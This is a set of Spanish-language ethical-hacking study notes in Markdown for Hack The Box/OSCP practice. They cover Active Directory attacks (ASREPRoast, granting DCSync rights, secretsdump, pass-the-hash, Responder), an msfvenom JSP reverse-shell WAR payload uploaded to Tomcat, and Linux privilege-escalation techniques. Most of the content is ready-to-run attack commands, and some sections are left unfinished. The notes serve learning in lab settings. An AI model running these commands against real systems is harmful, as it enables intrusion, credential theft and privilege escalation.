---
title: "Apuntes de Hacking ético"
author: ["ertiti11"]
date: "2020-07-25"
subject: "Markdown"
keywords: [Markdown, Example]
subtitle: "Pentest"
lang: "en"
titlepage: true
titlepage-color: "483D8B"
titlepage-text-color: "FFFAFA"
titlepage-rule-color: "FFFAFA"
titlepage-rule-height: 2
book: true
classoption: oneside
code-block-font-size: \scriptsize
---

# WINDOWS 
## INTRUSIÓN

### SMB


es el puerto 445
para escanearlo primero hacemos tradicional de nmap y despues podemos listar directorios con ```bash smbmap -H <IP> -u 'null--> usuario'```



utilidad ALLINFO para smbclient que detecta data escondida --> allinfo **archivo**

### RPC
se pueden enumerar usuarios por via de rpc con el siguiente comando:
```bash
rpcclient **IP** -U "" -c "enumdomusers" -N
```


### ASREPRoast
El ataque ASREPRoast se basa en encontrar usuarios que no requieren pre-autenticación de Kerberos. Lo cual significa que cualquiera puede enviar una petición AS_REQ en nombre de uno de esos usuarios y recibir un mensaje AS_REP correcto.
Esta respuesta contiene un fragmento del mensaje cifrado con la clave del usuario, que se obtiene de su contraseña. Por lo tanto, este mensaje se puede tratar de crackear offline para obtener las credenciales de dicho usuario.
```bash
crackmapexec ldap **DOMINIO** -u **usuario o archivo con ususarios** -p 'es nulo o no' --asreproast hashuser -outfile

```


### EVILWIN-RM
si tenemos un usuario y contraseña y hacemos:

```bash
crackmapexec smb host -u 'user' -p 'password'
```

y sale el resultado como **pwnded**
podemos lanzar el siguiente comando:

```bash
evil-winrm -i **HOST**  -u **USUARIO** -p **CONTRASEÑA**

```



## ESCALADA DE PRIVILEGIOS
### DOMAIN CONTROLLER
#### GRUPOS
+ <STRONG>ACCOUNT OPERATORS</STRONG> : Los miembros de este grupo pueden crear, modificar o borrar cuentas de usuarios, grupos y equipos dentro del DC. Podríamos crear un usuario y meterlo en algún grupo con privilegios, como por ejemplo [Exchange Windows Permissions]**EXCHANGE WINDOWS PERMISSIONS**:

```powershell
net user /add **user** **password** /domain
```

 y después meterlo en el grupo que queramos con :
 
 ```powershell
net group "**GRUPO**" **usuario** /add /domain
```


+ Exchange Windows Permissions: Este grupo tiene permiso **WriteDacl**


#### ATAQUES SI USER TIENE WRITEDACL
Lo primero será pasar a la máquina víctima el siguiente script:

https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1

Después, deberemos de importarlo de la siguiente manera en la máquina víctima:

```powershell
Import-Module .\PowerView.ps1
```

Después, segun BloodHound:

```powershell
$SecPassword = ConvertTo-SecureString '**CONTRASEÑA**' -AsPlainText -Force 
$Cred = New-Object System.Management.Automation.PSCredential('**DOMINIO**\**USUARIO**', $SecPassword)
Add-DomainObjectAcl -Credential $Cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity titi -Rights DCSync

```

Una vez hecho, podremos dumpear los hashes **NTLMv1** que nos serviran para hacer **passh the hash** con los usuarios que hemos dumpeado:

```bash
impacket-secretsdump htb.local/titi@10.10.10.161
```

Resultado:

```hash
htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
```

De esta salida, lo que nos vale para hacer el **pass the hash**, ser la ultima parte.

ahora realizaremos el **pass the hash**:

```bash
evil-winrm -i 10.10.10.161 -u 'Administrator' -H '32693b11e6aa90eb43d32c72a07ceea6'




### BLOODHOUND
Esta es una herramienta que se puede utilizar para mapear un DC, por lo tanto se pueden descubrir usuarios que tipos de privilegios tienen y que grupos del dominio pertenecen, ESTÁ ACEPTADO EN EL OSCP.
para usarla deberemos de tener instalado a traves de apt **bloodhound** y **neo4j**,
para iniciarlo deberemos de escribir lo siguiente:

```bash
sudo neo4j start
```

despues nos dara una url y tendremos que poner de usuario y contraseña **neo4j**, aunque más tarde podemos cambiar esto.
Una vez realizado estos pasos, procedemos a ejecutar lo siguiente:

```bash
bloodhound --nosanbox
```

se nos abrira una aplicación y lo que deberemos de introducir son las contraseñas que habíamos puesto anteriormente en *neo4j*.
una vez hechos todos estos pasos deberemos de llevar el binario **sharphound.exe** o el script **SharpHound.ps1** que podemos encontrar en github. 
una vez estando uno de los dos en la máquina víctima, debemos ejecutarlo con ese comando, en la *máquina víctima*:
```bash
.\SharpHound.exe -c all
```

Esto nos reportará un zip que posteriormente cargaremos en bloodhound que anteriormente habiamos iniciado.

![](./images/sharphound.png)

Una vez cargado el archivo, nos iremos a esta parte donde nos pone *Analisys*, y aquí podemos seleccionar que es lo que queremos ver.




# LINUX 
## ENUMERACION
### DNS

Puede que no encontremos ningun subdominio haciendo **fuzzing**, por lo tanto otra via seria que si vemos el **Puerto 53** abierto, podamos resolver de otras formas otros subdomios:

```bash
dig axfr cronos.htb @10.10.10.13
```



## MSFVENOM

### WAR

```bash 
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f war > shell.war
```



## Tratamiento de la TTY

```bash
script /dev/null -c bash
```


despues:

cntrl + z

se saldra y despues escribiremos lo siguiente:

```bash
stty raw -echo; fg
```


y despues :

```bash
reset xterm
```


comprobaremos que las variables de SHELL=bash y TERM=xterm.


## ESCALADA DE PRIVILEGIOS

### VERSION DE DISTRO
```bash
uname -r
```


### DIRTY COW
Dirty Cow es quizá el exploit de kernel más ampliamente conocido para GNU/Linux. Apareció en el año 2016 y permitía realizar una escalada de privilegios en local. Tal fue su fama, que hasta posee página web propia:


+ https://dirtycow.ninja/





### GRUPOS

```bash
id
```


### TAREAS CRON

el path para buscar taread cron en linux son:

```table
/etc/cron.d
```


Máquinas **Hack the box**:
+ Bashed 
+ Celestial 
+ Cronos 
+ Curling 
+ Europa 
+ FriendZone 
+ LaCasaDePapel

### BINARIOS CON PRIVILEGIOS
Dentro del fichero de configuración de "SUDO" existe la posibilidad de otorgar permisos de super usuario a un archivo ejecutable o binario, sin requerir para ello ningún tipo de autenticación. Para detectarlo, basta con fijarse en que exista la siguiente línea de texto: 
+  NOPASSWD:

![[./images/sudo.png]]

Máquinas **Hack the box**:

+  Academy 
+  Bashed
+  Blocky 
+  Blunder 
+  Canape 
+  FluxCapacitor 
+  Jewel 
+  Networked 
+  Nibbles 
+  OpenAdmin 
+  Shocker 
+  SneakyMailer 
+  Tenten


### HIJACKING PYTHON LIBRARY

Al detectar un “import”, el intérprete de Python realiza una búsqueda por sus directorios en busca de un módulo propio del lenguaje y, en caso de no encontrarlo, recurre a la ruta donde se ha ejecutado el propio script. Para comprobar el orden por el que Python realiza la búsqueda de un módulo en alguno de sus directorios, se debe ejecutar el siguiente comando:
```python
python -c 'import sys; print("\n".join(sys.path))'
```



En caso de disponer de permisos de escritura sobre alguna de las rutas y, en caso de no haber una ruta anterior que se ejecute antes que la ruta donde se puede escribir, entonces es posible suplantar al fichero original. Si el script se ha ejecutado con permisos de administrador y si ha sido posible suplantar al original, se producirá la ejecución de código con un usuario root. 

A su vez, puede darse la posibilidad de detectar un módulo que no ha sido instalado pero que es requerido por un script. En estos casos, basta con crear dicho módulo tanto en el directorio del script como en las rutas de **Python**.

Máquinas **Hack the box**:
+  Admirer 
+  Lazy 
+  Magic 
+  Stratosphere


### LEAKY PATH
si vemos que en algún lago se esta llamando a ejecutar a algún ejecutable con la ruta corta se puede cambiar el path para que ejecute primero un ejecutable o script que tu te crees, ejemplo:

mal:
```bash
cat archivo
```
bien:
```bash
/bin/cat /path/to/archivo
```

para cambiar el path

```bash
export PATH=/temp:$PATH
```
se suele utilizar /temp ya que en ese directorio se puede crear y hacer lo que quieras.



### PERMISOS SUID

para buscarlos usaremos:

```bash
find / -perm -4000 2>/dev/null
```

Más tarde comprobamos en https://GTFObins.github.io
Máquinas **Hack the box**:

+ Charon 
+ Bank 
+ Frolic 
+ Jarvis 
+ Lazy 
+ Magic 
+ Mango 
+ SwagShop 
+ Wall

###  ARCHIVO /etc/passwd
Para detectar si se tienen permisos de escritura de este fichero, basta con ejecutar el siguiente comando:

```bash
ls -l /etc/passwd
```

Crear una nueva contraseña en caso de poder escribir el fichero:
```bash
openssl passwd -1 -salt USER PASSWORD
```

Máquinas **Hack the box**:
+ Apocalyst

### GRUPOS
si un usuario esta en el grupo (lxd) o en el grupo (docker) habria maneras de elevar nuestro privilegio.
```bash
searchsploit lxd
```

### TÉCNICAS AUTOMATIZADAS

+ LinEnum (**Bash**)

https://github.com/rebootuser/LinEnum

+ LinuxPrivChecker (**Python**)

https://github.com/sleventyeleven/linuxprivchecker

+ LinuxSmartEnumeration (**Bash**)

https://github.com/diego-treitos/linux-smart-enumeration

+ LinPEAS(**Bash**)

https://github.com/carlospolop/PEASS-ng/tere/master/linPEAS



# GENERAL
## SSH
### AUTHORIZED KEYS
si por firewall no podemos conectarnos por ssh pero si tenemos ejecucion de comandos o algo por el estilo, podemos hacernos un par de claves con:
```bash
ssh-keygen
```
e introducirlas en /etc/home/user/.ssh/public.pub.

## SSTI(CREO)(JINJA2)
en este caso me he encontrado con un file upload en el que no puedo hacer un bypass, pues lo que podemos hacer es una images con el comando que queramos que ejecute python ya que lo que contenga lo va a guardar en una etiqueta **p** por lo tanto si hacer {{}}
en flask se ejecutara:



## FUZZING
### WFUZZ
#### DIRECTORIOS

```bash
wfuzz -c -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt   --hc 404 http://domain/FUZZ
```

##### SUBDOMINIOS

```bash
wfuzz -c -f sub-fighter -w top5000.txt -u 'http://target.tld' -H "Host: FUZZ.target.tld" 
```



## Tomcat


path en un lfi para ver que usuario con que roles pueden acceder a  /manager
**/usr/share/tomcat9/etc/tomcat-users.xml**

si tenemos rol *manager-script* podemos administrar los archivos war y hacer un upload un war malicioso 
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f war > shell.war
```

y para subirlo por curl:


```bash
curl --upload-file appplication-0.1-1.war "http://username:password@localhost:8080/manager/deploy?path=/application-0.1-1
```





# ACTIVE DIRECTORY
## SMBRELAY
Para ejecutar este ataque, tanto por ipv4 y por ipv6, se usara una herramienta que es el responder.py.
sambarelay tipico:
archivo de configuracion **/usr/share/responder/Responder.conf** se deja tal cual.

```bash
responder -I eth0 -rdw
```